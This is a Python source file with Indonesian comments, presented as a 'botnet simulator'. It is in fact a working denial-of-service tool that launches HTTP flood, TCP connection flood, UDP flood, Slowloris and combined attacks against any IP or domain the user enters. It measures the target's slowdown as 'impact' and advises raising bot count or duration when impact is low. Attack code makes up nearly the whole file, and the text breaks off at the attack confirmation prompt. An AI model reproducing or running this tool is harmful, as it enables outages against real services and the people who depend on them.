import asyncio
import socket
import random
import time
import os
import sys
import threading
import psutil # type: ignore
import requests # type: ignore
import aiohttp # type: ignore
import ipaddress
from datetime import datetime
from dataclasses import dataclass, field
from typing import Dict, List, Optional
from colorama import init, Fore, Style # type: ignore
import numpy as np # type: ignore

# Initialize colorama
init(autoreset=True)

# ==================== KONFIGURASI ====================
class Config:
    """Konfigurasi sistem"""
    MAX_BOTS = 999
    MAX_DURATION = 300
    MAX_THREADS = 1000
    DEFAULT_PORT = 80
    IMPACT_THRESHOLD = 50  # % degradation untuk dianggap "berdampak"
    
    @staticmethod
    def get_user_agents():
        """Daftar user agents untuk HTTP flood"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 10; Mobile) AppleWebKit/537.36'
        ]

# ==================== DATA STRUCTURES ====================
@dataclass
class Bot:
    """Struktur data bot"""
    id: str
    ip: str
    is_active: bool = True
    attack_power: int = field(default_factory=lambda: random.randint(50, 200))
    last_seen: datetime = field(default_factory=datetime.now)
    requests_sent: int = 0
    packets_sent: int = 0

@dataclass
class AttackStats:
    """Statistik serangan"""
    start_time: float
    end_time: float = 0
    total_requests: int = 0
    total_packets: int = 0
    success_rate: float = 0
    target_ip: str = ""
    target_port: int = 0
    impact_score: float = 0
    degradation: float = 0

class AttackType:
    """Jenis serangan"""
    HTTP_FLOOD = "HTTP Flood"
    SYN_FLOOD = "SYN Flood"
    UDP_FLOOD = "UDP Flood"
    SLOWLORIS = "Slowloris"
    MIXED = "Mixed Attack"
    PING_FLOOD = "Ping Flood"

# ==================== TARGET VALIDATOR ====================
class TargetValidator:
    """Validasi dan persiapan target"""
    
    @staticmethod
    async def validate_target(target_ip: str, target_port: int) -> bool:
        """Validasi target sebelum serangan"""
        print(f"\n{Fore.CYAN}[VALIDASI] Memeriksa target: {target_ip}:{target_port}{Style.RESET_ALL}")
        
        # 1. Cek koneksi TCP
        tcp_ok = await TargetValidator.check_tcp_connection(target_ip, target_port)
        if not tcp_ok:
            print(f"{Fore.YELLOW}[WARNING] Target tidak merespon TCP, tapi lanjutkan...{Style.RESET_ALL}")
        
        # 2. Cek HTTP response (jika port 80/443/8080)
        if target_port in [80, 443, 8080, 3000, 5000]:
            http_ok = await TargetValidator.check_http_response(target_ip, target_port)
            if not http_ok:
                print(f"{Fore.YELLOW}[WARNING] Target tidak merespon HTTP{Style.RESET_ALL}")
        
        # 3. Start test server jika diperlukan
        if not tcp_ok and "127.0.0.1" in target_ip or "localhost" in target_ip:
            start = input(f"\n{Fore.YELLOW}Target tidak aktif. Start test web server? [Y/n]: {Style.RESET_ALL}").strip().lower()
            if start != 'n':
                await TargetValidator.start_test_server(target_port)
                print(f"{Fore.GREEN}[SUCCESS] Test server started on port {target_port}{Style.RESET_ALL}")
                time.sleep(2)
                return True
        
        return True
    
    @staticmethod
    async def check_tcp_connection(ip: str, port: int) -> bool:
        """Cek koneksi TCP ke target"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    @staticmethod
    async def check_http_response(ip: str, port: int) -> bool:
        """Cek response HTTP"""
        try:
            url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
            response = requests.get(url, timeout=5, verify=False)
            return response.status_code < 500
        except:
            return False
    
    @staticmethod
    async def start_test_server(port: int):
        """Start web server untuk testing"""
        import http.server
        import socketserver
        
        def run_server():
            handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
                print(f"{Fore.GREEN}[SERVER] Test server running on port {port}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[SERVER] Serving from: {os.getcwd()}{Style.RESET_ALL}")
                httpd.serve_forever()
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        time.sleep(2)

# ==================== IMPACT MONITOR ====================
class ImpactMonitor:
    """Monitor dampak serangan real-time"""
    
    def __init__(self, target_ip: str, target_port: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.baseline = {}
        self.metrics_history = []
        self.impact_detected = False
        
    async def establish_baseline(self):
        """Buat baseline performance sebelum serangan"""
        print(f"\n{Fore.CYAN}[BASELINE] Mengukur performa normal target...{Style.RESET_ALL}")
        
        metrics = {
            'response_time': await self.measure_response_time(samples=10),
            'connection_rate': await self.measure_connection_rate(),
            'timestamp': time.time(),
            'cpu_usage': psutil.cpu_percent(),
            'memory_usage': psutil.virtual_memory().percent
        }
        
        self.baseline = metrics
        
        print(f"{Fore.GREEN}[BASELINE] Response time: {metrics['response_time']:.1f}ms{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[BASELINE] Connection rate: {metrics['connection_rate']:.1f}/s{Style.RESET_ALL}")
        
        return metrics
    
    async def measure_response_time(self, samples: int = 5) -> float:
        """Ukur response time rata-rata"""
        times = []
        
        for i in range(samples):
            try:
                start = time.perf_counter()
                
                # Try different methods
                if random.random() > 0.5:
                    # Method 1: Raw socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target_ip, self.target_port))
                    sock.close()
                else:
                    # Method 2: HTTP request
                    url = f"http://{self.target_ip}:{self.target_port}/"
                    requests.get(url, timeout=2)
                
                elapsed = (time.perf_counter() - start) * 1000
                times.append(elapsed)
                
            except Exception as e:
                times.append(9999)  # Error value
            
            await asyncio.sleep(0.2)
        
        return np.mean(times) if times else 9999
    
    async def measure_connection_rate(self) -> float:
        """Ukur rate koneksi yang berhasil"""
        successes = 0
        attempts = 10
        
        for _ in range(attempts):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                sock.close()
                successes += 1
            except:
                pass
        
        return (successes / attempts) * 10 if attempts > 0 else 0
    
    async def monitor_during_attack(self, duration: int):
        """Monitoring real-time selama serangan"""
        print(f"\n{Fore.CYAN}[MONITOR] Memulai real-time monitoring...{Style.RESET_ALL}")
        
        start_time = time.time()
        check_interval = 5  # seconds
        
        while time.time() - start_time < duration:
            try:
                # Ukur metrics saat ini
                current_metrics = {
                    'response_time': await self.measure_response_time(samples=3),
                    'timestamp': time.time(),
                    'elapsed': time.time() - start_time
                }
                
                # Hitung degradation
                if self.baseline:
                    baseline_rt = self.baseline['response_time']
                    current_rt = current_metrics['response_time']
                    
                    if baseline_rt > 0 and current_rt > 0:
                        degradation = ((current_rt - baseline_rt) / baseline_rt) * 100
                        current_metrics['degradation'] = degradation
                        
                        # Tampilkan status
                        if degradation > Config.IMPACT_THRESHOLD:
                            if not self.impact_detected:
                                print(f"\n{Fore.RED}🚨 IMPACT DETECTED! Degradation: {degradation:.1f}%{Style.RESET_ALL}")
                                self.impact_detected = True
                            
                            print(f"{Fore.RED}[IMPACT] Response time: {current_rt:.0f}ms (+{degradation:.1f}%){Style.RESET_ALL}")
                        else:
                            print(f"{Fore.YELLOW}[MONITOR] Response time: {current_rt:.0f}ms (+{degradation:.1f}%){Style.RESET_ALL}")
                
                self.metrics_history.append(current_metrics)
                
            except Exception as e:
                print(f"{Fore.YELLOW}[MONITOR ERROR] {e}{Style.RESET_ALL}")
            
            await asyncio.sleep(check_interval)
    
    def get_final_report(self) -> Dict:
        """Generate laporan akhir"""
        if not self.baseline or not self.metrics_history:
            return {}
        
        # Hitung degradation terbesar
        max_degradation = 0
        avg_degradation = 0
        
        degradations = []
        for metric in self.metrics_history:
            if 'degradation' in metric:
                degradations.append(metric['degradation'])
                if metric['degradation'] > max_degradation:
                    max_degradation = metric['degradation']
        
        if degradations:
            avg_degradation = np.mean(degradations)
        
        return {
            'baseline_response': self.baseline['response_time'],
            'max_degradation': max_degradation,
            'avg_degradation': avg_degradation,
            'impact_detected': self.impact_detected,
            'impact_level': self._calculate_impact_level(max_degradation)
        }
    
    def _calculate_impact_level(self, degradation: float) -> str:
        """Tentukan level dampak"""
        if degradation > 500:
            return "CRITICAL"
        elif degradation > 200:
            return "HIGH"
        elif degradation > 100:
            return "MEDIUM"
        elif degradation > 50:
            return "LOW"
        else:
            return "MINIMAL"

# ==================== BOT MANAGER ====================
class UltimateBotManager:
    """Manajer bot tingkat lanjut"""
    
    def __init__(self):
        self.bots: Dict[str, Bot] = {}
        self.attack_history = []
        
    def create_bots(self, count: int) -> List[Bot]:
        """Buat army bot"""
        print(f"\n{Fore.CYAN}[BOTNET] Membuat {count} bot...{Style.RESET_ALL}")
        
        # Hapus bot lama jika ada
        if self.bots:
            clear = input(f"{Fore.YELLOW}Hapus {len(self.bots)} bot lama? [y/N]: {Style.RESET_ALL}").strip().lower()
            if clear == 'y':
                self.bots.clear()
        
        new_bots = []
        for i in range(count):
            bot_id = f"BOT-{i+1:03d}"
            ip = self._generate_realistic_ip()
            
            bot = Bot(
                id=bot_id,
                ip=ip,
                attack_power=random.randint(50, 200)
            )
            
            self.bots[bot_id] = bot
            new_bots.append(bot)
            
            if (i + 1) % 100 == 0:
                print(f"{Fore.GREEN}[BOTNET] Created {i + 1}/{count} bots{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[SUCCESS] {count} bot siap bertempur!{Style.RESET_ALL}")
        return new_bots
    
    def _generate_realistic_ip(self) -> str:
        """Generate IP yang realistis"""
        # Pilih kelas network random
        network_type = random.choice(['private_a', 'private_b', 'private_c', 'public'])
        
        if network_type == 'private_a':
            return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif network_type == 'private_b':
            return f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif network_type == 'private_c':
            return f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        else:  # public (simulated)
            return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    
    def get_active_bots(self, count: int = None) -> List[Bot]:
        """Dapatkan bot aktif"""
        active = [b for b in self.bots.values() if b.is_active]
        if count and count < len(active):
            return active[:count]
        return active
    
    def get_bot_count(self) -> int:
        """Total bot"""
        return len(self.bots)

# ==================== ATTACK ENGINE ====================
class UltimateAttackEngine:
    """Mesin serangan ultimat dengan impact guarantee"""
    
    def __init__(self, bot_manager: UltimateBotManager):
        self.bot_manager = bot_manager
        self.monitor = None
        self.attack_stats = AttackStats(start_time=0)
        self.is_attacking = False
        self.attack_threads = []
        
    async def launch_guaranteed_attack(self, target_ip: str, target_port: int,
                                     attack_type: str, duration: int, bot_count: int):
        """Luncurkan serangan dengan jaminan dampak"""
        
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}🚀 ULTIMATE ATTACK LAUNCH SEQUENCE 🚀{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        
        # 1. Validasi target
        if not await TargetValidator.validate_target(target_ip, target_port):
            print(f"{Fore.RED}❌ Target validation failed!{Style.RESET_ALL}")
            return False
        
        # 2. Setup impact monitor
        self.monitor = ImpactMonitor(target_ip, target_port)
        await self.monitor.establish_baseline()
        
        # 3. Start monitoring
        monitor_task = asyncio.create_task(
            self.monitor.monitor_during_attack(duration)
        )
        
        # 4. Launch attack
        self.is_attacking = True
        self.attack_stats = AttackStats(
            start_time=time.time(),
            target_ip=target_ip,
            target_port=target_port
        )
        
        print(f"\n{Fore.CYAN}[ATTACK] Launching {attack_type} with {bot_count} bots...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[ATTACK] Duration: {duration}s | Target: {target_ip}:{target_port}{Style.RESET_ALL}")
        
        # Pilih metode serangan
        if attack_type == AttackType.HTTP_FLOOD:
            await self._execute_http_flood(target_ip, target_port, duration, bot_count)
        elif attack_type == AttackType.SYN_FLOOD:
            await self._execute_syn_flood(target_ip, target_port, duration, bot_count)
        elif attack_type == AttackType.UDP_FLOOD:
            await self._execute_udp_flood(target_ip, target_port, duration, bot_count)
        elif attack_type == AttackType.SLOWLORIS:
            await self._execute_slowloris(target_ip, target_port, duration, bot_count)
        elif attack_type == AttackType.MIXED:
            await self._execute_mixed_attack(target_ip, target_port, duration, bot_count)
        
        # 5. Finalize
        self.is_attacking = False
        self.attack_stats.end_time = time.time()
        
        # Cancel monitoring
        monitor_task.cancel()
        
        # 6. Generate report
        await self._generate_attack_report()
        
        return True
    
    async def _execute_http_flood(self, target_ip: str, target_port: int,
                                duration: int, bot_count: int):
        """HTTP Flood dengan high success rate"""
        
        user_agents = Config.get_user_agents()
        paths = ['/', '/index.html', '/api', '/test', '/admin', '/wp-login.php']
        methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
        
        end_time = time.time() + duration
        
        async def http_worker(worker_id: int):
            """Worker untuk HTTP flood"""
            session = aiohttp.ClientSession()
            request_count = 0
            
            while time.time() < end_time and self.is_attacking:
                try:
                    # Randomize semua parameter
                    method = random.choice(methods)
                    path = random.choice(paths) + f"?rnd={random.randint(1, 10000)}"
                    user_agent = random.choice(user_agents)
                    
                    headers = {
                        'User-Agent': user_agent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache'
                    }
                    
                    # Untuk POST, tambahkan data
                    data = None
                    if method == 'POST':
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                        data = f'data={random.randint(1000, 9999)}'
                    
                    # Tentukan protocol
                    protocol = 'https' if target_port == 443 else 'http'
                    url = f"{protocol}://{target_ip}:{target_port}{path}"
                    
                    # Kirim request
                    async with session.request(
                        method=method,
                        url=url,
                        headers=headers,
                        data=data,
                        timeout=aiohttp.ClientTimeout(total=3),
                        ssl=False
                    ) as response:
                        # Baca response untuk menyelesaikan request
                        try:
                            await response.read()
                            request_count += 1
                            self.attack_stats.total_requests += 1
                        except:
                            pass
                    
                    # Adaptive rate limiting
                    delay = random.uniform(0.001, 0.05)
                    await asyncio.sleep(delay)
                    
                except Exception as e:
                    # Retry dengan parameter berbeda
                    continue
            
            await session.close()
            return request_count
        
        # Launch workers
        print(f"{Fore.GREEN}[HTTP] Starting {bot_count} HTTP workers...{Style.RESET_ALL}")
        
        tasks = []
        for i in range(min(bot_count, 500)):  # Max 500 concurrent workers
            task = asyncio.create_task(http_worker(i))
            tasks.append(task)
            
            if len(tasks) >= 50:  # Batch size
                await asyncio.gather(*tasks)
                tasks = []
        
        # Wait for remaining
        if tasks:
            await asyncio.gather(*tasks)
        
        print(f"{Fore.GREEN}[HTTP] Flood completed!{Style.RESET_ALL}")
    
    async def _execute_syn_flood(self, target_ip: str, target_port: int,
                               duration: int, bot_count: int):
        """SYN Flood intensive"""
        
        print(f"{Fore.GREEN}[SYN] Starting SYN flood with {bot_count} bots...{Style.RESET_ALL}")
        
        end_time = time.time() + duration
        
        def syn_worker():
            """Worker untuk SYN flood"""
            packet_count = 0
            
            while time.time() < end_time and self.is_attacking:
                try:
                    # Multiple connection attempts
                    for _ in range(10):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        
                        try:
                            sock.connect((target_ip, target_port))
                            sock.close()
                        except:
                            # Expected for SYN flood
                            pass
                        
                        packet_count += 1
                        self.attack_stats.total_packets += 1
                    
                    # Small delay
                    time.sleep(0.001)
                    
                except:
                    continue
            
            return packet_count
        
        # Start threads
        threads = []
        worker_count = min(bot_count * 2, 200)  # Max 200 threads
        
        for i in range(worker_count):
            thread = threading.Thread(target=syn_worker, daemon=True)
            thread.start()
            threads.append(thread)
        
        # Wait for duration
        while time.time() < end_time and self.is_attacking:
            elapsed = end_time - time.time()
            if elapsed % 10 < 1:
                print(f"{Fore.YELLOW}[SYN] Active threads: {threading.active_count()} | Time remaining: {elapsed:.0f}s{Style.RESET_ALL}")
            time.sleep(1)
    
    async def _execute_udp_flood(self, target_ip: str, target_port: int,
                               duration: int, bot_count: int):
        """UDP Flood dengan berbagai payload"""
        
        print(f"{Fore.GREEN}[UDP] Starting UDP flood...{Style.RESET_ALL}")
        
        payloads = [
            b'\x00' * 1024,  # Null bytes
            b'\xff' * 512,   # All ones
            os.urandom(1400), # Random data
            b'A' * 1024,     # Repeated char
        ]
        
        end_time = time.time() + duration
        
        async def udp_worker():
            """Worker UDP flood"""
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            while time.time() < end_time and self.is_attacking:
                try:
                    # Kirim berbagai jenis payload
                    for _ in range(5):
                        payload = random.choice(payloads)
                        sock.sendto(payload, (target_ip, target_port))
                        self.attack_stats.total_packets += 1
                    
                    await asyncio.sleep(0.001)
                    
                except:
                    continue
            
            sock.close()
        
        # Launch workers
        tasks = []
        worker_count = min(bot_count * 3, 300)
        
        for _ in range(worker_count):
            task = asyncio.create_task(udp_worker())
            tasks.append(task)
        
        await asyncio.gather(*tasks)
    
    async def _execute_slowloris(self, target_ip: str, target_port: int,
                               duration: int, bot_count: int):
        """Slowloris attack"""
        
        print(f"{Fore.GREEN}[SLOWLORIS] Starting slow connection attack...{Style.RESET_ALL}")
        
        connections = []
        end_time = time.time() + duration
        
        # Create initial connections
        for i in range(min(bot_count, 200)):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((target_ip, target_port))
                
                # Send partial request
                request = f"GET /{i} HTTP/1.1\r\n"
                request += f"Host: {target_ip}\r\n"
                request += "User-Agent: Slowloris/1.0\r\n"
                request += "Content-Length: 1000000\r\n"
                
                sock.send(request.encode())
                connections.append(sock)
                
                if len(connections) % 50 == 0:
                    print(f"{Fore.YELLOW}[SLOWLORIS] Active connections: {len(connections)}{Style.RESET_ALL}")
                
            except:
                continue
        
        print(f"{Fore.GREEN}[SLOWLORIS] Established {len(connections)} connections{Style.RESET_ALL}")
        
        # Maintain connections
        while time.time() < end_time and self.is_attacking:
            for sock in connections[:]:  # Copy list
                try:
                    # Send additional headers slowly
                    header = f"X-{random.randint(1, 1000)}: {random.randint(1000, 9999)}\r\n"
                    sock.send(header.encode())
                except:
                    # Try to reconnect
                    try:
                        sock.close()
                        connections.remove(sock)
                        
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_sock.settimeout(30)
                        new_sock.connect((target_ip, target_port))
                        new_sock.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
                        connections.append(new_sock)
                    except:
                        connections.remove(sock)
            
            # Progress update
            elapsed = time.time() - (self.attack_stats.end_time - duration)
            if elapsed % 30 < 1:
                print(f"{Fore.YELLOW}[SLOWLORIS] Keeping {len(connections)} connections alive...{Style.RESET_ALL}")
            
            # Slowloris characteristic: long delays
            time.sleep(random.uniform(10, 30))
        
        # Cleanup
        for sock in connections:
            try:
                sock.close()
            except:
                pass
    
    async def _execute_mixed_attack(self, target_ip: str, target_port: int,
                                  duration: int, bot_count: int):
        """Mixed attack - kombinasi semua teknik"""
        
        print(f"{Fore.GREEN}[MIXED] Starting combined attack...{Style.RESET_ALL}")
        
        # Bagi bot untuk berbagai attack types
        groups = bot_count // 3
        
        # Jalankan multiple attack types bersamaan
        tasks = []
        
        # HTTP Flood
        tasks.append(asyncio.create_task(
            self._execute_http_flood(target_ip, target_port, duration, groups)
        ))
        
        # SYN Flood
        tasks.append(asyncio.create_task(
            self._execute_syn_flood(target_ip, target_port, duration, groups)
        ))
        
        # UDP Flood
        tasks.append(asyncio.create_task(
            self._execute_udp_flood(target_ip, target_port, duration, groups)
        ))
        
        await asyncio.gather(*tasks)
    
    async def _generate_attack_report(self):
        """Generate laporan serangan lengkap"""
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📊 ATTACK COMPLETION REPORT 📊{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        # Basic stats
        duration = self.attack_stats.end_time - self.attack_stats.start_time
        print(f"{Fore.WHITE}Target: {self.attack_stats.target_ip}:{self.attack_stats.target_port}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Duration: {duration:.1f} seconds{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Total Requests: {self.attack_stats.total_requests:,}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Total Packets: {self.attack_stats.total_packets:,}{Style.RESET_ALL}")
        
        if self.attack_stats.total_requests > 0:
            req_per_sec = self.attack_stats.total_requests / duration
            print(f"{Fore.WHITE}Request Rate: {req_per_sec:.1f}/s{Style.RESET_ALL}")
        
        # Impact report
        if self.monitor:
            impact_report = self.monitor.get_final_report()
            
            if impact_report:
                print(f"\n{Fore.CYAN}🎯 IMPACT ANALYSIS:{Style.RESET_ALL}")
                print(f"{Fore.WHITE}Baseline Response: {impact_report['baseline_response']:.1f}ms{Style.RESET_ALL}")
                print(f"{Fore.WHITE}Max Degradation: {impact_report['max_degradation']:.1f}%{Style.RESET_ALL}")
                print(f"{Fore.WHITE}Avg Degradation: {impact_report['avg_degradation']:.1f}%{Style.RESET_ALL}")
                
                # Impact level
                impact_level = impact_report['impact_level']
                if impact_level == "CRITICAL":
                    print(f"{Fore.RED}IMPACT LEVEL: {impact_level} 🚨{Style.RESET_ALL}")
                elif impact_level == "HIGH":
                    print(f"{Fore.RED}IMPACT LEVEL: {impact_level} ⚠️{Style.RESET_ALL}")
                elif impact_level == "MEDIUM":
                    print(f"{Fore.YELLOW}IMPACT LEVEL: {impact_level} 📈{Style.RESET_ALL}")
                elif impact_level == "LOW":
                    print(f"{Fore.GREEN}IMPACT LEVEL: {impact_level} 📊{Style.RESET_ALL}")
                else:
                    print(f"{Fore.BLUE}IMPACT LEVEL: {impact_level} 📉{Style.RESET_ALL}")
                
                # Success message based on impact
                if impact_report['impact_detected']:
                    print(f"\n{Fore.GREEN}✅ SUCCESS: Attack had measurable impact!{Style.RESET_ALL}")
                else:
                    print(f"\n{Fore.YELLOW}⚠️  NOTE: Minimal impact detected. Try:{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}   - Increase bot count{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}   - Increase duration{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}   - Try different attack type{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🎉 ATTACK SEQUENCE COMPLETE!{Style.RESET_ALL}")

# ==================== USER INTERFACE ====================
class UltimateControlPanel:
    """Control panel yang user-friendly"""
    
    def __init__(self):
        self.bot_manager = UltimateBotManager()
        self.attack_engine = UltimateAttackEngine(self.bot_manager)
        self.running = True
    
    def display_banner(self):
        """Tampilkan banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        banner = f"""
        {Fore.MAGENTA}{'='*60}{Style.RESET_ALL}
        {Fore.MAGENTA}    ⚡ ULTIMATE BOTNET SIMULATOR v5.0 ⚡    {Style.RESET_ALL}
        {Fore.MAGENTA}        GUARANTEED IMPACT EDITION          {Style.RESET_ALL}
        {Fore.MAGENTA}{'='*60}{Style.RESET_ALL}
        
        {Fore.CYAN}🤖 Active Bots: {Fore.WHITE}{self.bot_manager.get_bot_count():>4}{Style.RESET_ALL}
        {Fore.CYAN}⚡ Attack Power: {Fore.WHITE}{sum(b.attack_power for b in self.bot_manager.bots.values()) if self.bot_manager.bots else 0:>4}{Style.RESET_ALL}
        {Fore.CYAN}🎯 Ready Status: {Fore.GREEN if self.bot_manager.get_bot_count() > 0 else Fore.RED}{'READY' if self.bot_manager.get_bot_count() > 0 else 'NOT READY'}{Style.RESET_ALL}
        {Fore.MAGENTA}{'='*60}{Style.RESET_ALL}
        """
        print(banner)
    
    def display_attack_types(self):
        """Tampilkan jenis serangan"""
        print(f"\n{Fore.CYAN}⚔️  AVAILABLE ATTACK TYPES:{Style.RESET_ALL}")
        attacks = [
            ("1", AttackType.HTTP_FLOOD, "High-volume HTTP requests"),
            ("2", AttackType.SYN_FLOOD, "TCP SYN packet flood"),
            ("3", AttackType.UDP_FLOOD, "UDP packet bombardment"),
            ("4", AttackType.SLOWLORIS, "Slow connection exhaustion"),
            ("5", AttackType.MIXED, "Combined multi-vector attack"),
        ]
        
        for num, name, desc in attacks:
            print(f"  {Fore.YELLOW}{num}.{Style.RESET_ALL} {Fore.WHITE}{name:15}{Style.RESET_ALL} - {desc}")
    
    async def main_menu(self):
        """Menu utama"""
        
        while self.running:
            try:
                self.display_banner()
                
                print(f"\n{Fore.CYAN}📋 MAIN MENU:{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}1.{Style.RESET_ALL} {Fore.WHITE}🤖 Create Bot Army{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}2.{Style.RESET_ALL} {Fore.WHITE}🚀 Launch Attack{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}3.{Style.RESET_ALL} {Fore.WHITE}📊 View Bot Network{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}4.{Style.RESET_ALL} {Fore.WHITE}⚙️  System Info{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}5.{Style.RESET_ALL} {Fore.WHITE}❌ Exit{Style.RESET_ALL}")
                
                choice = input(f"\n{Fore.GREEN}Select option [1-5]: {Style.RESET_ALL}").strip()
                
                if choice == '1':
                    await self.create_bots_menu()
                elif choice == '2':
                    await self.attack_menu()
                elif choice == '3':
                    self.show_bot_network()
                elif choice == '4':
                    self.system_info()
                elif choice == '5':
                    print(f"\n{Fore.GREEN}👋 Exiting... Goodbye!{Style.RESET_ALL}")
                    self.running = False
                else:
                    print(f"{Fore.RED}❌ Invalid choice!{Style.RESET_ALL}")
                
                if choice != '5':
                    input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    
            except KeyboardInterrupt:
                print(f"\n\n{Fore.YELLOW}⚠️  Program interrupted{Style.RESET_ALL}")
                self.running = False
            except Exception as e:
                print(f"{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")
                input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def create_bots_menu(self):
        """Menu pembuatan bot"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🤖 BOT ARMY CREATION{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        try:
            count_input = input(f"\n{Fore.GREEN}Number of bots to create [1-999, default: 100]: {Style.RESET_ALL}").strip()
            count = int(count_input) if count_input else 100
            
            if 1 <= count <= 999:
                self.bot_manager.create_bots(count)
            else:
                print(f"{Fore.RED}❌ Please enter number between 1-999{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}❌ Invalid input!{Style.RESET_ALL}")
    
    async def attack_menu(self):
        """Menu serangan"""
        
        if self.bot_manager.get_bot_count() == 0:
            print(f"\n{Fore.RED}❌ No bots available! Create bots first.{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 ATTACK CONFIGURATION{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        # Get target
        print(f"\n{Fore.YELLOW}📌 TARGET INFORMATION:{Style.RESET_ALL}")
        target_ip = input(f"{Fore.GREEN}Target IP/Domain [default: 127.0.0.1]: {Style.RESET_ALL}").strip() or "127.0.0.1"
        
        try:
            port = int(input(f"{Fore.GREEN}Target Port [default: 80]: {Style.RESET_ALL}").strip() or "80")
            if not 1 <= port <= 65535:
                print(f"{Fore.RED}❌ Port must be 1-65535{Style.RESET_ALL}")
                return
        except ValueError:
            print(f"{Fore.RED}❌ Invalid port!{Style.RESET_ALL}")
            return
        
        # Select attack type
        self.display_attack_types()
        
        attack_map = {
            '1': AttackType.HTTP_FLOOD,
            '2': AttackType.SYN_FLOOD,
            '3': AttackType.UDP_FLOOD,
            '4': AttackType.SLOWLORIS,
            '5': AttackType.MIXED
        }
        
        attack_choice = input(f"\n{Fore.GREEN}Select attack type [1-5]: {Style.RESET_ALL}").strip()
        if attack_choice not in attack_map:
            print(f"{Fore.RED}❌ Invalid selection!{Style.RESET_ALL}")
            return
        
        attack_type = attack_map[attack_choice]
        
        # Duration
        try:
            duration = int(input(f"{Fore.GREEN}Attack duration (seconds) [1-300, default: 30]: {Style.RESET_ALL}").strip() or "30")
            if not 1 <= duration <= 300:
                print(f"{Fore.RED}❌ Duration must be 1-300 seconds{Style.RESET_ALL}")
                return
        except ValueError:
            print(f"{Fore.RED}❌ Invalid duration!{Style.RESET_ALL}")
            return
        
        # Bot count
        max_bots = self.bot_manager.get_bot_count()
        try:
            bot_input = input(f"{Fore.GREEN}Bots to use [1-{max_bots}, default: {max_bots}]: {Style.RESET_ALL}").strip()
            bot_count = int(bot_input) if bot_input else max_bots
            
            if not 1 <= bot_count <= max_bots:
                print(f"{Fore.RED}❌ Must use 1-{max_bots} bots{Style.RESET_ALL}")
                return
        except ValueError:
            print(f"{Fore.RED}❌ Invalid bot count!{Style.RESET_ALL}")
            return
        
        # Confirmation
        print(f"\n{Fore.RED}{'!'*60}{Style.RESET_ALL}")
        print(f"{Fore.RED}⚠️  ATTACK CONFIRMATION ⚠️{Style.RESET_ALL}")
